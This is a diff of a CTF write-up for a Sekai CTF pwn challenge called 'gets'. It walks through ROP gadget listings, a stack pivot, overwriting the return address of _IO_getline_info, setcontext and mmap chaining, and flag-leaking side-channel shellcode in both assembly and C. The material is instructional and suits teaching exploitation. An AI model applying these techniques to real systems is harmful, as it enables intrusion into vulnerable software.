@@ -1,16 +1,16 @@
-﻿# Writeup
 
-Recently i joined [Project Sekai](https://ctftime.org/team/169557) CTF team and its been great 😉. So yea we hosted our first edition of [Sekai CTF](https://ctftime.org/event/1619) with a pretty cool UI. 
+# Writeup
 
-![Website UI](https://i.imgur.com/ZCDrjlx.png)
-	
-I created a pwn challenge **gets** for our CTF and we got 2 solves and this is my first time creating a pwn challenge for a CTF. 
+```yaml
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
 
-![Challenge](https://i.imgur.com/miIInLb.png)
+The source code was provided for a more streamlined experience for players (and so they can find the bug quicker :laughing:).
 
-## Challenge Overview
-
-I went easy with the challenge so i provided the players with the source code so it is less hard to reverse and find the bug :laughing:. 
 ```py
 #include <stdio.h>
 #include <unistd.h>
@@ -40,177 +40,223 @@ int main(int argc, char const *argv[])
 }
 ```
 
-### Checksec Output
+As you can see in the source code, only `mmap`, `open`, and `read` are allowed, meaning you shouldn't be getting any sort of libc leaks using some hacky IO exploits. We will see later that the seccomp can be bypassed using a side-channel attack.
+
+### Bug
+
+There is an available stack overflow attack—let's check out the ROP gadgets in the binary:
+
 ```yaml
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    No canary found
-    NX:       NX enabled
-    PIE:      No PIE (0x400000)
-```
+TARGET 0 - 'chall': ELF-X64, 0x00000000401080 entry, 597/1 executable bytes/segments
 
-### Seccomp blacklist
-As you can see in the source code only **MMAP, OPEN** and **READ** is allowed. So you shouldn't be getting any sort of libc leaks using some hacky IO exploits. We will see the seccomp bypass later. Seccomp bypass is discussed [here](NEED%20TO%20UPDATE%20XXXX)
-
-## Bug
-
-So there is a stack overflow in the challenge and lets look at the ROP gadgets in the binary
-```yaml
-TARGET 0 - 'chall': ELF-X64, 0x00000000401080 entry, 597/1 executable bytes/segments 
-
-0x0000000040111c: adc [rax+0x40], al; add bh, bh; loopne 0x0000000000401189; nop [rax+rax]; ret; 
-0x000000004010a0: adc eax, 0x2f3b; hlt; nop [rax+rax]; endbr64; ret; 
-0x0000000040100e: add [rax-0x7b], cl; shl byte ptr [rdx+rax-0x1], 0xd0; add rsp, 0x8; ret; 
-0x000000004010ab: add [rax], al; add [rax], al; add bl, dh; nop edx, edi; ret; 
-0x000000004010ac: add [rax], al; add [rax], al; endbr64; ret; 
-0x00000000401215: add [rax], al; add [rax], al; leave; ret; 
-0x00000000401149: add [rax], al; add [rbp-0x3d], ebx; nop; ret; 
-0x0000000040114a: add [rax], al; add [rbp-0x3d], ebx; nop; ret; 
-0x000000004010ad: add [rax], al; add bl, dh; nop edx, edi; ret; 
-0x00000000401216: add [rax], al; add cl, cl; ret; 
-0x000000004010ae: add [rax], al; endbr64; ret; 
-0x000000004010a3: add [rax], al; hlt; nop [rax+rax]; endbr64; ret; 
-0x00000000401217: add [rax], al; leave; ret; 
-0x00000000401126: add [rax], al; ret; 
-0x0000000040100d: add [rax], al; test rax, rax; je short 0x0000000000401016; call rax; 
-0x000000004010d2: add [rax], al; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax; 
-0x00000000401114: add [rax], al; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
-0x00000000401113: add [rax], al; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
-0x00000000401125: add [rax], r8b; ret; 
-0x0000000040114c: add [rbp-0x3d], ebx; nop; ret; 
-0x0000000040114b: add [rcx], al; pop rbp; ret; 
-0x000000004010a4: add ah, dh; nop [rax+rax]; endbr64; ret; 
-0x0000000040111f: add bh, bh; loopne 0x0000000000401189; nop [rax+rax]; ret; 
-0x000000004010af: add bl, dh; nop edx, edi; ret; 
-0x00000000401247: add bl, dh; nop edx, edi; sub rsp, 0x8; add rsp, 0x8; ret; 
-0x00000000401218: add cl, cl; ret; 
-0x0000000040111d: add dil, dil; loopne 0x0000000000401189; nop [rax+rax]; ret; 
-0x00000000401147: add eax, 0x2ec3; add [rbp-0x3d], ebx; nop; ret; 
-0x00000000401111: add eax, 0x2ee2; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
-0x000000004010cf: add eax, 0x2f14; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax; 
-0x0000000040100a: add eax, 0x2fe1; test rax, rax; je short 0x0000000000401016; call rax; 
-0x00000000401017: add esp, 0x8; ret; 
-0x00000000401016: add rsp, 0x8; ret; 
-0x00000000401014: call rax; 
-0x000000004010b3: cli; ret; 
-0x0000000040124b: cli; sub rsp, 0x8; add rsp, 0x8; ret; 
-0x00000000401244: dec ecx; ret; 
-0x000000004010b0: endbr64; ret; 
-0x00000000401248: endbr64; sub rsp, 0x8; add rsp, 0x8; ret; 
-0x000000004010a5: hlt; nop [rax+rax]; endbr64; ret; 
-0x00000000401169: in eax, 0x5f; ret; 
-0x00000000401145: inc esi; add eax, 0x2ec3; add [rbp-0x3d], ebx; nop; ret; 
-0x00000000401012: je short 0x0000000000401016; call rax; 
-0x000000004010d7: je short 0x00000000004010e0; mov edi, 0x404010; jmp rax; 
-0x00000000401119: je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
-0x000000004010de: jmp rax; 
-0x00000000401219: leave; ret; 
-0x0000000040100b: loope 0x000000000040103c; add [rax], al; test rax, rax; je short 0x0000000000401016; call rax; 
-0x00000000401121: loopne 0x0000000000401189; nop [rax+rax]; ret; 
-0x00000000401146: mov byte ptr [rip+0x2ec3], 0x1; pop rbp; ret; 
-0x00000000401165: mov dl, [rbp+0x48]; mov ebp, esp; pop rdi; ret; 
-0x00000000401214: mov eax, 0x0; leave; ret; 
-0x00000000401110: mov eax, [rip+0x2ee2]; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
-0x000000004010ce: mov eax, [rip+0x2f14]; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax; 
-0x00000000401009: mov eax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax; 
-0x00000000401168: mov ebp, esp; pop rdi; ret; 
-0x000000004010d9: mov edi, 0x404010; jmp rax; 
-0x0000000040110f: mov rax, [rip+0x2ee2]; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
-0x000000004010cd: mov rax, [rip+0x2f14]; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax; 
-0x00000000401008: mov rax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax; 
-0x00000000401167: mov rbp, rsp; pop rdi; ret; 
-0x000000004010a6: nop [rax+rax]; endbr64; ret; 
-0x000000004010a7: nop [rax+rax]; endbr64; ret; 
-0x000000004010a8: nop [rax+rax]; endbr64; ret; 
-0x00000000401122: nop [rax+rax]; ret; 
-0x00000000401123: nop [rax+rax]; ret; 
-0x000000004010b1: nop edx, edi; ret; 
-0x00000000401249: nop edx, edi; sub rsp, 0x8; add rsp, 0x8; ret; 
-0x0000000040116c: nop; pop rbp; ret; 
-0x0000000040114f: nop; ret; 
-0x00000000401007: or [rax-0x75], cl; add eax, 0x2fe1; test rax, rax; je short 0x0000000000401016; call rax; 
-0x0000000040111a: or eax, 0x404010bf; add bh, bh; loopne 0x0000000000401189; nop [rax+rax]; ret; 
-0x0000000040114d: pop rbp; ret; 
-0x0000000040116a: pop rdi; ret; 
-0x00000000401166: push rbp; mov rbp, rsp; pop rdi; ret; 
-0x0000000040101a: ret; 
-0x00000000401118: shl byte ptr [rbp+rcx-0x41], 0x10; add dil, dil; loopne 0x0000000000401189; nop [rax+rax]; ret; 
-0x00000000401011: shl byte ptr [rdx+rax-0x1], 0xd0; add rsp, 0x8; ret; 
-0x0000000040124d: sub esp, 0x8; add rsp, 0x8; ret; 
-0x00000000401005: sub esp, 0x8; mov rax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax; 
-0x0000000040124c: sub rsp, 0x8; add rsp, 0x8; ret; 
-0x00000000401004: sub rsp, 0x8; mov rax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax; 
-0x000000004010aa: test [rax], al; add [rax], al; add [rax], al; endbr64; ret; 
-0x00000000401010: test eax, eax; je short 0x0000000000401016; call rax; 
-0x000000004010d5: test eax, eax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax; 
-0x00000000401117: test eax, eax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
-0x0000000040100f: test rax, rax; je short 0x0000000000401016; call rax; 
-0x000000004010d4: test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax; 
-0x00000000401116: test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax; 
+0x0000000040111c: adc [rax+0x40], al; add bh, bh; loopne 0x0000000000401189; nop [rax+rax]; ret;
+0x000000004010a0: adc eax, 0x2f3b; hlt; nop [rax+rax]; endbr64; ret;
+0x0000000040100e: add [rax-0x7b], cl; shl byte ptr [rdx+rax-0x1], 0xd0; add rsp, 0x8; ret;
+0x000000004010ab: add [rax], al; add [rax], al; add bl, dh; nop edx, edi; ret;
+0x000000004010ac: add [rax], al; add [rax], al; endbr64; ret;
+0x00000000401215: add [rax], al; add [rax], al; leave; ret;
+0x00000000401149: add [rax], al; add [rbp-0x3d], ebx; nop; ret;
+0x0000000040114a: add [rax], al; add [rbp-0x3d], ebx; nop; ret;
+0x000000004010ad: add [rax], al; add bl, dh; nop edx, edi; ret;
+0x00000000401216: add [rax], al; add cl, cl; ret;
+0x000000004010ae: add [rax], al; endbr64; ret;
+0x000000004010a3: add [rax], al; hlt; nop [rax+rax]; endbr64; ret;
+0x00000000401217: add [rax], al; leave; ret;
+0x00000000401126: add [rax], al; ret;
+0x0000000040100d: add [rax], al; test rax, rax; je short 0x0000000000401016; call rax;
+0x000000004010d2: add [rax], al; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax;
+0x00000000401114: add [rax], al; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
+0x00000000401113: add [rax], al; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
+0x00000000401125: add [rax], r8b; ret;
+0x0000000040114c: add [rbp-0x3d], ebx; nop; ret;
+0x0000000040114b: add [rcx], al; pop rbp; ret;
+0x000000004010a4: add ah, dh; nop [rax+rax]; endbr64; ret;
+0x0000000040111f: add bh, bh; loopne 0x0000000000401189; nop [rax+rax]; ret;
+0x000000004010af: add bl, dh; nop edx, edi; ret;
+0x00000000401247: add bl, dh; nop edx, edi; sub rsp, 0x8; add rsp, 0x8; ret;
+0x00000000401218: add cl, cl; ret;
+0x0000000040111d: add dil, dil; loopne 0x0000000000401189; nop [rax+rax]; ret;
+0x00000000401147: add eax, 0x2ec3; add [rbp-0x3d], ebx; nop; ret;
+0x00000000401111: add eax, 0x2ee2; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
+0x000000004010cf: add eax, 0x2f14; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax;
+0x0000000040100a: add eax, 0x2fe1; test rax, rax; je short 0x0000000000401016; call rax;
+0x00000000401017: add esp, 0x8; ret;
+0x00000000401016: add rsp, 0x8; ret;
+0x00000000401014: call rax;
+0x000000004010b3: cli; ret;
+0x0000000040124b: cli; sub rsp, 0x8; add rsp, 0x8; ret;
+0x00000000401244: dec ecx; ret;
+0x000000004010b0: endbr64; ret;
+0x00000000401248: endbr64; sub rsp, 0x8; add rsp, 0x8; ret;
+0x000000004010a5: hlt; nop [rax+rax]; endbr64; ret;
+0x00000000401169: in eax, 0x5f; ret;
+0x00000000401145: inc esi; add eax, 0x2ec3; add [rbp-0x3d], ebx; nop; ret;
+0x00000000401012: je short 0x0000000000401016; call rax;
+0x000000004010d7: je short 0x00000000004010e0; mov edi, 0x404010; jmp rax;
+0x00000000401119: je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
+0x000000004010de: jmp rax;
+0x00000000401219: leave; ret;
+0x0000000040100b: loope 0x000000000040103c; add [rax], al; test rax, rax; je short 0x0000000000401016; call rax;
+0x00000000401121: loopne 0x0000000000401189; nop [rax+rax]; ret;
+0x00000000401146: mov byte ptr [rip+0x2ec3], 0x1; pop rbp; ret;
+0x00000000401165: mov dl, [rbp+0x48]; mov ebp, esp; pop rdi; ret;
+0x00000000401214: mov eax, 0x0; leave; ret;
+0x00000000401110: mov eax, [rip+0x2ee2]; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
+0x000000004010ce: mov eax, [rip+0x2f14]; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax;
+0x00000000401009: mov eax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax;
+0x00000000401168: mov ebp, esp; pop rdi; ret;
+0x000000004010d9: mov edi, 0x404010; jmp rax;
+0x0000000040110f: mov rax, [rip+0x2ee2]; test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
+0x000000004010cd: mov rax, [rip+0x2f14]; test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax;
+0x00000000401008: mov rax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax;
+0x00000000401167: mov rbp, rsp; pop rdi; ret;
+0x000000004010a6: nop [rax+rax]; endbr64; ret;
+0x000000004010a7: nop [rax+rax]; endbr64; ret;
+0x000000004010a8: nop [rax+rax]; endbr64; ret;
+0x00000000401122: nop [rax+rax]; ret;
+0x00000000401123: nop [rax+rax]; ret;
+0x000000004010b1: nop edx, edi; ret;
+0x00000000401249: nop edx, edi; sub rsp, 0x8; add rsp, 0x8; ret;
+0x0000000040116c: nop; pop rbp; ret;
+0x0000000040114f: nop; ret;
+0x00000000401007: or [rax-0x75], cl; add eax, 0x2fe1; test rax, rax; je short 0x0000000000401016; call rax;
+0x0000000040111a: or eax, 0x404010bf; add bh, bh; loopne 0x0000000000401189; nop [rax+rax]; ret;
+0x0000000040114d: pop rbp; ret;
+0x0000000040116a: pop rdi; ret;
+0x00000000401166: push rbp; mov rbp, rsp; pop rdi; ret;
+0x0000000040101a: ret;
+0x00000000401118: shl byte ptr [rbp+rcx-0x41], 0x10; add dil, dil; loopne 0x0000000000401189; nop [rax+rax]; ret;
+0x00000000401011: shl byte ptr [rdx+rax-0x1], 0xd0; add rsp, 0x8; ret;
+0x0000000040124d: sub esp, 0x8; add rsp, 0x8; ret;
+0x00000000401005: sub esp, 0x8; mov rax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax;
+0x0000000040124c: sub rsp, 0x8; add rsp, 0x8; ret;
+0x00000000401004: sub rsp, 0x8; mov rax, [rip+0x2fe1]; test rax, rax; je short 0x0000000000401016; call rax;
+0x000000004010aa: test [rax], al; add [rax], al; add [rax], al; endbr64; ret;
+0x00000000401010: test eax, eax; je short 0x0000000000401016; call rax;
+0x000000004010d5: test eax, eax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax;
+0x00000000401117: test eax, eax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
+0x0000000040100f: test rax, rax; je short 0x0000000000401016; call rax;
+0x000000004010d4: test rax, rax; je short 0x00000000004010e0; mov edi, 0x404010; jmp rax;
+0x00000000401116: test rax, rax; je short 0x0000000000401128; mov edi, 0x404010; jmp rax;
 
 CONFIG [ search: ROP-JOP-SYS (default), x_match: none, max_len: 5, syntax: Intel, regex_filter: none ]
 RESULT [ unique_gadgets: 89, search_time: 2.424206ms, print_time: 4.156297ms ]
 ```
-You can see that you can only control **rdi** and **rbp**. Why is that?
-Because this binary comes without our favourite **__libc_csu_init** function in which mostly has all the useful rop gadgets it. It might be probably because the binary is compiled with **libc version 2.35** or maybe because of **gcc 12.2.0**. So lets 
+
+You can see that you can only control `$rdi` and `$rbp`. This is because the binary comes without our favorite `__libc_csu_init` function, which mostly contains all the useful ROP gadgets—it was probably compiled with libc 2.35 or gcc 12.2.0. So let's use:
+
 ```xml
    0x401236 <main+27>    jmp   exploit@plt                      <exploit@plt>
-   ```
-   ## Exploit
-   So first lets look at our challenge description.
-   ![description](https://i.imgur.com/vqX9o7U.jpg)
-   ```
-   Flag is in format  `SEKAI\{[A-Z_]+\}`. Bruteforcing is not required. Rate limit is set up for this challenge.
-   ```
+```
 
-   The binary cannot be solved by
-   
+### Exploit
 
- - **Basic Ret2libc :** Because you dont have libc leaks.
- - **Ret2DLResolve :** Because the binary is compiled with Full Relro
- - **Fancy FSOP:** Because write syscall is not allowed.
- 
- You only need 
- 
- - **pop rdi :** For setting the argument for gets call.
- - **pop rbp & leave; ret :** For stack pivot.
- - **gets :** Well you'll see
+Here was the provided challenge description:
 
-## House of Rootkit
+> ![description](https://i.imgur.com/vqX9o7U.jpg)
+> Flag is in format `SEKAI\{[A-Z_]+\}`. Bruteforcing is not required. Rate limit is set up for this challenge.
 
-In ***House of Rootkit*** (I just named it) the exploit involves -
+The binary cannot be solved with:
 
- 1. Stack overflow with gets.
- 2. Stack pivot to bss and calling gets keeping bss as the stack address to push some libc addresses (return addresses) in bss. We will turn this libc addresses into rop gadgets later in the exploit.
- 4. Overwriting the return address of `_IO_getline_info` function with this you can achieve the primitive to control alot of registers which you don't have control of using basic pop gadgets which is not given in the binary. 
- ![iogetline demo](https://i.imgur.com/VQQcvOZ.png)
- 
- 5. With register control mainly **RBP** and **EBX** we can now use the
-    3d gadget to create a useful rop gadget. I used it to craft these gadgets in bss and later pivot to those addresses where i crafted to create a rop chain to call mmap.
-    ```yaml
+- basic ret2libc, since you don't have a libc leak
+- Ret2DLResolve, because the binary is compiled with full RELRO
+- fancy FSOP, because a write syscall is not allowed
+
+You only need:
+
+- `pop rdi` for setting the argument for gets call
+- `pop rbp` & `leave; ret` for stack pivot
+- `gets`, for uhh... you'll see.
+
+### House of Rootkit
+
+In the _House of Rootkit_ (I just named it), the exploit involves:
+
+1.  Stack overflow with `gets`.
+2.  Stack pivot to the block starting symbol (bss) and calling `gets`, keeping the bss as the stack address to push some libc addresses (return addresses) into it. We'll turn this libc addresses into ROP gadgets later in the exploit.
+
+![libc addresses in bss](https://i.imgur.com/iWrMPhU.png)
+
+3.  Overwriting the return address of `_IO_getline_info` function. With this, you can achieve the primitive to control a lot of registers, which you don't have control of using basic `pop` gadgets. You can do this by calling `gets` with the `$rdi` register set above the `$rsp` register, like `rdi` <- `rsp - 0x50`.
+
+![iogetline demo](https://i.imgur.com/VQQcvOZ.png)
+
+(source code of [\_IO_getline_info](https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/iogetline.c#L46))
+
+```c
+#include "libioP.h"
+#include <string.h>
+
+size_t _IO_getline_info (FILE *fp, char *buf, size_t n, int delim,
+		  int extract_delim, int *eof)
+{
+  char *ptr = buf;
+  if (eof != NULL)
+    *eof = 0;
+  if (__builtin_expect (fp->_mode, -1) == 0)
+    _IO_fwide (fp, -1);
+	....
+	....
+	....
+	....
+	  memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len); // data is now copied to buffer
+	  fp->_IO_read_ptr += len;
+	  ptr += len;
+	  n -= len;
+	}
+    }
+  return ptr - buf; // you control where to return
+}
+libc_hidden_def (_IO_getline_info)
+```
+
+disassembly of `_IO_getline_info`:
+
+```yaml
+  0x00007f8d1e479d32 <+290>:	call   QWORD PTR [rip+0x1831f0]        # memcpy
+  0x00007f8d1e479d38 <+296>:	mov    r8,QWORD PTR [rsp+0x8]
+  0x00007f8d1e479d3d <+301>:	lea    rax,[r12+rbx*1]
+  0x00007f8d1e479d41 <+305>:	mov    QWORD PTR [r15+0x8],r8
+  0x00007f8d1e479d45 <+309>:	add    rsp,0x28
+  0x00007f8d1e479d49 <+313>:	pop    rbx
+  0x00007f8d1e479d4a <+314>:	pop    rbp
+  0x00007f8d1e479d4b <+315>:	pop    r12
+  0x00007f8d1e479d4d <+317>:	pop    r13
+  0x00007f8d1e479d4f <+319>:	pop    r14
+  0x00007f8d1e479d51 <+321>:	pop    r15
+=> 0x00007f8d1e479d53 <+323>:	ret
+```
+
+4.  With register control (mainly `$rbp` and `$ebx`, we can now use the 3D gadget to create a useful ROP gadget. I used it to craft these gadgets in BSS, and to later pivot to those addresses I crafted to create a ROP chain to call `mmap`.
+
+```yaml
     pop rax; pop rdx
-	setcontext;
-	syscall; ret
-	mmap;
- ```yaml
- 0x0000000040114c: add [rbp-0x3d], ebx; nop; ret; // 3d gadget
+        setcontext;
+        syscall; ret
+        mmap;
+```
+
+```yaml
+0x0000000040114c: add [rbp-0x3d], ebx; nop; ret; // 3d gadget
 ```
 
 ```c
 0x404068 —▸ 0x7f27806852c6 (__GI__IO_file_underflow+390) ◂— test   rax, rax
 
    0x40114c       <__do_global_dtors_aux+28>    add    dword ptr [rbp - 0x3d], ebx
- ► 0x40114f       <__do_global_dtors_aux+31>    nop    
-   0x401150       <__do_global_dtors_aux+32>    ret    
+ ► 0x40114f       <__do_global_dtors_aux+31>    nop
+   0x401150       <__do_global_dtors_aux+32>    ret
 
 0x404068 —▸ 0x7f278064eb2c (setcontext+294) ◂— mov    rsi, qword ptr [rdx + 0x70]
-
-
 ```
-5. I use setcontext to set the registers for mmap and also `pop rax; pop rdx;` gadget and then execute mmap syscall.
-![enter image description here](https://i.imgur.com/Yqcd7s2.png)
-The address is weird because i disabled ASLR for debugging purpose.
-6. Create RWX region and then leak flag byte by byte using side channel attack.
+
+5. Use `setcontext` to set the registers for `mmap` and the `pop rax; pop rdx;` gadget, and then execute the `mmap` syscall:
+   ![enter image description here](https://i.imgur.com/Yqcd7s2.png)
+
+The address is weird because I disabled ASLR for debugging purposes.
+
+6. Create a RWX region and then leak the flag byte by byte using a side channel attack:
+
 ```c
     global _start:
 
@@ -268,7 +314,61 @@ The address is weird because i disabled ASLR for debugging purpose.
     call get_oracle_byte;
     call cmp_flag_byte;
 
- ```
+```
+
+The c equivalent of the shellcode is
+
+```c
+#include <stdio.h>
+
+#include <fcntl.h>
+
+#include <signal.h>
+
+int open_flag() {
+   return open("flag.txt", O_RDONLY);
+}
+
+void read_flag(int fd, char buf[]) {
+   read(fd, buf, 50);
+}
+
+int get_flag_idx_byte() {
+   int tmp;
+   scanf("%d", & tmp);
+   return tmp;
+}
+
+char get_oracle_byte() {
+   int tmp;
+   read(0, & tmp, 1);
+   return tmp;
+}
+
+int main() {
+   int fd, flag_byte_idx;
+   char flag_byte;
+   char oracle_byte;
+   char buf[50];
+
+   fd = open_flag();
+   read_flag(fd, buf);
+
+   flag_byte_idx = get_flag_idx_byte();
+   flag_byte = buf[flag_byte_idx];
+
+   oracle_byte = get_oracle_byte();
+
+   if (flag_byte == oracle_byte) {
+       raise(SIGABRT);
+   } else {
+       main();
+   }
+
+   return 0;
+}
+```
+
 ```python
 #!/usr/bin/env python3
 
